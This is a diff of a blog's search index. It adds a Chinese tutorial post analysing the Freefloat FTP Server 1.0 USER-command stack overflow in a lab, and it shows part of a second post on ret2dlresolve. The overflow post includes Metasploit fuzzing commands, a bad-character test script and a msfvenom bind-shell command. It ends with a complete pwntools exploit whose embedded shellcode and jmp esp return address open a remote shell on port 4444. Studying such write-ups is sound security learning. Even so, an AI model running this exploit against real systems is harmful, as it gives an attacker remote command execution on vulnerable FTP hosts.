+<li>攻击机：kali 2.0</li>
+<li>攻击机配置<ul>
+<li>­    Pwntools</li>
+<li>­    Metasploit</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-复现过程"><a href="#2-复现过程" class="headerlink" title="2. 复现过程"></a>2. 复现过程</h3><p>使用两种工具Infigo FTPStress Fuzzer和Metasploit都能测试出溢出漏洞存在</p>
+<h4 id="2-1-使用Infigo-FTPStress-Fuzzer触发漏洞"><a href="#2-1-使用Infigo-FTPStress-Fuzzer触发漏洞" class="headerlink" title="2.1 使用Infigo FTPStress Fuzzer触发漏洞"></a>2.1 使用Infigo FTPStress Fuzzer触发漏洞</h4><h5 id="2-1-1-在windowsXP运行漏洞程序，程序打开ftp服务，并监听21号端口"><a href="#2-1-1-在windowsXP运行漏洞程序，程序打开ftp服务，并监听21号端口" class="headerlink" title="2.1.1 在windowsXP运行漏洞程序，程序打开ftp服务，并监听21号端口"></a>2.1.1 在windowsXP运行漏洞程序，程序打开ftp服务，并监听21号端口</h5><img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/1.png?raw=true" style="zoom:80%">
+
+<h5 id="2-1-2-ftpfuzz触发漏洞"><a href="#2-1-2-ftpfuzz触发漏洞" class="headerlink" title="2.1.2 ftpfuzz触发漏洞"></a>2.1.2 ftpfuzz触发漏洞</h5><img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/2.png?raw=true" style="zoom:80%">
+
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/3.png?raw=true" style="zoom:60%">
+
+<p>eip指向fuzz发送的测试数组‘AAAA‘，程序执行流已被更改，存在溢出漏洞</p>
+<h4 id="2-2-使用metasploit的ftp-fuzz进行测试"><a href="#2-2-使用metasploit的ftp-fuzz进行测试" class="headerlink" title="2.2 使用metasploit的ftp fuzz进行测试"></a>2.2 使用metasploit的ftp fuzz进行测试</h4><p>攻击机kali运行metasploit，运行如下命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">打开metasploit</span></span><br><span class="line">msfconsole</span><br><span class="line"><span class="meta">#</span><span class="bash">查询可用的fuzz</span></span><br><span class="line">search fuzzing</span><br><span class="line"><span class="meta">#</span><span class="bash">使用ftp fuzz模块</span></span><br><span class="line">use auxiliary/fuzzers/ftp/ftp_pre_post</span><br><span class="line"><span class="meta">#</span><span class="bash">设置靶机</span></span><br><span class="line">set RHOST 192.168.112.146</span><br><span class="line"><span class="meta">#</span><span class="bash">漏洞利用</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>运行结果</p>
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/4.png?raw=true" style="zoom:70%">
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/5.png?raw=true" style="zoom:60%">
+
+<p>靶机崩溃，eip指向未知内存地址，可以溢出</p>
+<h2 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h2><h3 id="1-背景知识"><a href="#1-背景知识" class="headerlink" title="1. 背景知识"></a>1. 背景知识</h3><p>最简单的栈溢出，jmp esp作为跳板跳转到栈中执行</p>
+<h3 id="2-详细分析"><a href="#2-详细分析" class="headerlink" title="2. 详细分析"></a>2. 详细分析</h3><h4 id="2-1-Immunity-Debugger调试"><a href="#2-1-Immunity-Debugger调试" class="headerlink" title="2.1 Immunity Debugger调试"></a>2.1 Immunity Debugger调试</h4><p>在靶机用Immunity Debugger打开freefloatftpserver1.0运行调试</p>
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/6.png?raw=true" style="zoom:80%">
+
+<h4 id="2-2-python发包测试"><a href="#2-2-python发包测试" class="headerlink" title="2.2 python发包测试"></a>2.2 python发包测试</h4><p>在kali攻击机用pwntools编写脚本，向ftp服务器的USER输入点发送数据包测试</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;192.168.112.146&quot;</span>, <span class="number">21</span>)</span><br><span class="line">paylad = <span class="string">&#x27;A&#x27;</span>*<span class="number">500</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>程序崩溃，eip指向0x41414141，由发送的数据A的ascii码为0x41可知，USER输入点存在溢出漏洞</p>
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/7.png?raw=true" style="zoom:80%">
+
+<h4 id="2-3-定位溢出点"><a href="#2-3-定位溢出点" class="headerlink" title="2.3 定位溢出点"></a>2.3 定位溢出点</h4><p>输入用户名之前，程序会输出一条ftp服务器版本的语句，在immunity debugger中定位输出这句话的函数，从而缩小定位漏洞函数的范围</p>
+<p><img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/8.png?raw=true" alt="my-logo.png"></p>
+<p>查询字符串</p>
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/9.png?raw=true" style="zoom:80%">
+
+<p>在wsprintw函数设置断点</p>
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/10.png?raw=true" style="zoom:80%">
+
+<p>重新发送payload，单步调试，直到运行到出现异常的函数freefloa.004020E0</p>
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/11.png?raw=true" style="zoom:80%">
+
+<p>在freefloa.004020E0函数设置断点，重新发送payload，f7单步步入此函数</p>
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/12.png?raw=true" style="zoom:80%">
+
+<p>重复上述操作，接着在freefloa.00402190函数设置断点，单步步入，程序会在运行到00402881处跳转到004028EB处执行，之后调用freefloa.00402DE0函数，程序崩溃</p>
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/13.png?raw=true" style="zoom:80%">
+
+<p>在freefloa.00402DE0函数设置断点，步入之后未发现存在子函数，并且在返回的时候执行retn 8指令</p>
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/14.png?raw=true" style="zoom:80%">
+
+<p>观察此时esp指向的返回地址为0x41414141，执行retn命令之后eip指向0x41414141，使得程序崩溃</p>
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/15.png?raw=true" style="zoom:80%">
+
+<p>得出结论：freefloa.00402DE0函数可能出现栈溢出</p>
+<h4 id="2-4-静态分析结合动态分析"><a href="#2-4-静态分析结合动态分析" class="headerlink" title="2.4 静态分析结合动态分析"></a>2.4 静态分析结合动态分析</h4><p>用IDA加载程序进行静态分析，定位到函数sub_00402DE0</p>
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/16.png?raw=true" style="zoom:80%">
+
+<p>Strcpy函数存在溢出漏洞，将函数第三个参数a3的值复制到局部变量v8中，如果a3过长，会覆盖返回地址，那sub_00402DE0函数的参数a2，a3到底是什么？这就回溯到调用此函数的位置了，通过之前动态分析可以得到调用函数为00402190，IDA静态分析分析得Sub_00402190将输入的字符串与各种ftp命令进行比较，根据命令进行不同的响应。</p>
+<p>用immunity debugger回溯到sub_00402190函数里的00402881地址，这个地址的指令跳转执行漏洞函数00402DE0，查看栈帧能够获得参数</p>
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/18.png?raw=true" style="zoom:80%">
+
+<p>在IDA中定位，aXommandNotUnde就是上图的command not understood字符串，此处跳转执行402DE0</p>
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/19.png?raw=true" style="zoom:80%">
+
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/20.png?raw=true" style="zoom:80%">
+
+<p>参数1 V16是输入字符串长度，参数2 v17是输入字符串‘AAAA‘:command not understood’ 查看函数栈帧可验证</p>
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/21.png?raw=true" style="zoom:80%">
+
+<p>结论：函数sub_402DE0栈帧结构，（ebp实际不存在，只是方便记录相对偏移）</p>
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/22.png?raw=true" style="zoom:80%">
+
+<p>只需填充0xFC-1个垃圾数据可溢出到函数返回地址（-1是因为程序在输入字符串前添加了单引号），重新组织poc，返回地址为cccc</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;192.168.112.146&quot;</span>, <span class="number">21</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*(<span class="number">0xfc</span>-<span class="number">1</span>) + <span class="string">&#x27;cccc&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>返回地址为0x63636363，是cccc的ascii码，验证成功</p>
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/23.png?raw=true" style="zoom:80%">
+
+
+<h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4. 漏洞利用"></a>4. 漏洞利用</h3><h4 id="1-利用条件"><a href="#1-利用条件" class="headerlink" title="1. 利用条件"></a>1. 利用条件</h4><p>Windows xp sp3未开启DEP保护</p>
+<h4 id="2-利用过程"><a href="#2-利用过程" class="headerlink" title="2. 利用过程"></a>2. 利用过程</h4><h5 id="1-排除坏字符"><a href="#1-排除坏字符" class="headerlink" title="1. 排除坏字符"></a>1. 排除坏字符</h5><p>在生成shellcode之前需要确定坏字符，用mona生成一个0x00到0xff的bytearray，发送payload，比对哪个字符发送后会破坏payload，将其排除即可</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;192.168.112.146&#x27;</span>,<span class="number">21</span>)</span><br><span class="line"><span class="built_in">bytearray</span> = (</span><br><span class="line"><span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f&quot;</span></span><br><span class="line"><span class="string">&quot;\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&quot;</span></span><br><span class="line"><span class="string">&quot;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&quot;</span></span><br><span class="line"><span class="string">&quot;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;</span></span><br><span class="line"><span class="string">&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&quot;</span></span><br><span class="line"><span class="string">&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;</span></span><br><span class="line"><span class="string">&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xfc</span>-<span class="number">1</span>) + <span class="string">&#x27;cccc&#x27;</span> + <span class="built_in">bytearray</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-生成shellcode"><a href="#2-生成shellcode" class="headerlink" title="2. 生成shellcode"></a>2. 生成shellcode</h5><p>利用metasploit生成windows反弹shell的shellcode，排除坏数据’\x00\x0a\x0d’，以c语言格式输出，靶机IP192.168.112.146</p>
+<p><code>msfvenom -p windows/shell_bind_tcp LHOSTS=192.168.112.146 LPORT=4444 -b &#39;\x00\x0a\x0d&#39; -f c</code></p>
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/24.png?raw=true" style="zoom:60%">
+
+<h5 id="3-内存中查找jmp-esp命令"><a href="#3-内存中查找jmp-esp命令" class="headerlink" title="3. 内存中查找jmp esp命令"></a>3. 内存中查找jmp esp命令</h5><p>使用mona插件查询jmp esp指令的地址</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">!mona jmp -r esp</span><br><span class="line"><span class="comment">#或者 </span></span><br><span class="line">!mona find -s <span class="string">&quot;\xff\xe4&quot;</span> -m</span><br></pre></td></tr></table></figure>
+
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/25.png?raw=true" style="zoom:80%">
+
+<p>从中选择一个地址0x77D29353，作为跳板，跳转到栈上执行shellcode</p>
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/26.png?raw=true" style="zoom:80%">
+
+<p>最终Exploit.py</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;192.168.112.146&#x27;</span>,<span class="number">21</span>)</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line"><span class="string">&quot;\xbf\xb9\x9b\xb3\x2f\xdb\xd2\xd9\x74\x24\xf4\x58\x33\xc9\xb1&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x31\x78\x12\x83\xc0\x04\x03\xc1\x95\x51\xda\xcd\x42\x17&quot;</span></span><br><span class="line"><span class="string">&quot;\x25\x2d\x93\x78\xaf\xc8\xa2\xb8\xcb\x99\x95\x08\x9f\xcf\x19&quot;</span></span><br><span class="line"><span class="string">&quot;\xe2\xcd\xfb\xaa\x86\xd9\x0c\x1a\x2c\x3c\x23\x9b\x1d\x7c\x22&quot;</span></span><br><span class="line"><span class="string">&quot;\x1f\x5c\x51\x84\x1e\xaf\xa4\xc5\x67\xd2\x45\x97\x30\x98\xf8&quot;</span></span><br><span class="line"><span class="string">&quot;\x07\x34\xd4\xc0\xac\x06\xf8\x40\x51\xde\xfb\x61\xc4\x54\xa2&quot;</span></span><br><span class="line"><span class="string">&quot;\xa1\xe7\xb9\xde\xeb\xff\xde\xdb\xa2\x74\x14\x97\x34\x5c\x64&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\x9a\xa1\x48\xab\xe2\xe6\x6f\x54\x91\x1e\x8c\xe9\xa2\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\xee\x35\x26\xfd\x49\xbd\x90\xd9\x68\x12\x46\xaa\x67\xdf\x0c&quot;</span></span><br><span class="line"><span class="string">&quot;\xf4\x6b\xde\xc1\x8f\x90\x6b\xe4\x5f\x11\x2f\xc3\x7b\x79\xeb&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\xda\x27\x5a\x92\x3c\x88\x03\x36\x37\x25\x57\x4b\x1a\x22&quot;</span></span><br><span class="line"><span class="string">&quot;\x94\x66\xa4\xb2\xb2\xf1\xd7\x80\x1d\xaa\x7f\xa9\xd6\x74\x78&quot;</span></span><br><span class="line"><span class="string">&quot;\xce\xcc\xc1\x16\x31\xef\x31\x3f\xf6\xbb\x61\x57\xdf\xc3\xe9&quot;</span></span><br><span class="line"><span class="string">&quot;\xa7\xe0\x11\x87\xaf\x47\xca\xba\x52\x37\xba\x7a\xfc\xd0\xd0&quot;</span></span><br><span class="line"><span class="string">&quot;\x74\x23\xc0\xda\x5e\x4c\x69\x27\x61\x63\x36\xae\x87\xe9\xd6&quot;</span></span><br><span class="line"><span class="string">&quot;\xe6\x10\x85\x14\xdd\xa8\x32\x66\x37\x81\xd4\x2f\x51\x16\xdb&quot;</span></span><br><span class="line"><span class="string">&quot;\xaf\x77\x30\x4b\x24\x94\x84\x6a\x3b\xb1\xac\xfb\xac\x4f\x3d&quot;</span></span><br><span class="line"><span class="string">&quot;\x4e\x4c\x4f\x14\x38\xed\xc2\xf3\xb8\x78\xff\xab\xef\x2d\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\xa2\x65\xc0\x68\x1c\x9b\x19\xec\x67\x1f\xc6\xcd\x66\x9e\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x4d\xb0\x55\x72\xc9\xe4\x09\x25\x87\x52\xec\x9f\x69\x0c&quot;</span></span><br><span class="line"><span class="string">&quot;\xa6\x4c\x20\xd8\x3f\xbf\xf3\x9e\x3f\xea\x85\x7e\xf1\x43\xd0&quot;</span></span><br><span class="line"><span class="string">&quot;\x81\x3e\x04\xd4\xfa\x22\xb4\x1b\xd1\xe6\xc4\x51\x7b\x4e\x4d&quot;</span></span><br><span class="line"><span class="string">&quot;\x3c\xee\xd2\x10\xbf\xc5\x11\x2d\x3c\xef\xe9\xca\x5c\x9a\xec&quot;</span></span><br><span class="line"><span class="string">&quot;\x97\xda\x77\x9d\x88\x8e\x77\x32\xa8\x9a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x77d29353 -&gt; jmp esp</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xfc</span>-<span class="number">1</span>) + <span class="string">&quot;\x53\x93\xd2\x77&quot;</span> + <span class="string">&quot;\x90&quot;</span>*<span class="number">16</span> + shellcode</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注：shellcode前16个\x90是因为函数返回时的retn 8需要跳过，也可作为滑板，同时作为缓冲区防止执行shellcode时更改内存使得shellcode执行代码也被更改</p>
+</blockquote>
+<p>执行流程：</p>
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/27.png?raw=true" style="zoom:80%">
+
+<p>栈帧结构：</p>
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/28.png?raw=true" style="zoom:80%">
+
+<p>Shellcode使靶机开放4444端口进行shell连接攻击机，连接成功</p>
+<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/29.png?raw=true" style="zoom:80%">
+
+<h2 id="四、参考文献"><a href="#四、参考文献" class="headerlink" title="四、参考文献"></a>四、参考文献</h2><ul>
+<li><a href="https://www.exploit-db.com/exploits/23243">https://www.exploit-db.com/exploits/23243</a></li>
+<li><a href="https://giantbranch.blog.csdn.net/article/details/53291788">https://giantbranch.blog.csdn.net/article/details/53291788</a></li>
+<li><a href="https://www.youtube.com/watch?v=i6Br57lh4uE">https://www.youtube.com/watch?v=i6Br57lh4uE</a></li>
+<li><a href="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>二进制安全</category>
+      </categories>
+      <tags>
+        <tag>漏洞分析</tag>
+        <tag>栈溢出</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>动态链接-ret2dlresolve</title>
     <url>/2021/05/18/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5-ret2dlresolve/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复习一下动态链接的全过程，通过plt和got的延迟绑定详细过程，彻底理解了ret2dlresolve</p>
@@ -917,7 +979,7 @@
 <p>plt每个plt条目大小为0x10，首条指令为跳转到对应的got表项地址，got表里的地址为函数在内存中的真正地址</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">08048380 &lt;setbuf@plt&gt;:</span><br><span class="line"> 8048380:	ff 25 00 a0 04 08    	jmp    *0x804a000</span><br><span class="line"> 8048386:	68 00 00 00 00       	push   $0x0</span><br><span class="line"> 804838b:	e9 e0 ff ff ff       	jmp    8048370 &lt;setbuf@plt-0x10&gt;</span><br><span class="line"></span><br><span class="line">08048390 &lt;read@plt&gt;:</span><br><span class="line"> 8048390:	ff 25 04 a0 04 08    	jmp    *0x804a004</span><br><span class="line"> 8048396:	68 08 00 00 00       	push   $0x8</span><br><span class="line"> 804839b:	e9 d0 ff ff ff       	jmp    8048370 &lt;setbuf@plt-0x10&gt;</span><br></pre></td></tr></table></figure>
 
-<p>在read@plt地址0x8048390下断点，运行程序，程序跳转到<a href="mailto:&#x72;&#101;&#x61;&#100;&#64;&#103;&#x6f;&#x74;&#46;&#x70;&#x6c;&#x74;">&#x72;&#101;&#x61;&#100;&#64;&#103;&#x6f;&#x74;&#46;&#x70;&#x6c;&#x74;</a>地址。</p>
+<p>在read@plt地址0x8048390下断点，运行程序，程序跳转到<a href="mailto:&#x72;&#101;&#x61;&#100;&#64;&#103;&#x6f;&#x74;&#x2e;&#x70;&#108;&#x74;">&#x72;&#101;&#x61;&#100;&#64;&#103;&#x6f;&#x74;&#x2e;&#x70;&#108;&#x74;</a>地址。</p>
 <ul>
 <li>由于是第一次调用read函数，got表里并没有填充read函数的真实地址，需要调用解析函数解析实际地址填充到got表里，而这个解析函数就由plt[0]调用，所以程序跳转回自己的plt表第二条指令</li>
 <li>0x08048396将read函数自身在.rel.plt表的偏移压栈（实际是偏移*8），作为解析函数的参数，随后跳转到plt[0]-0x8048370</li>
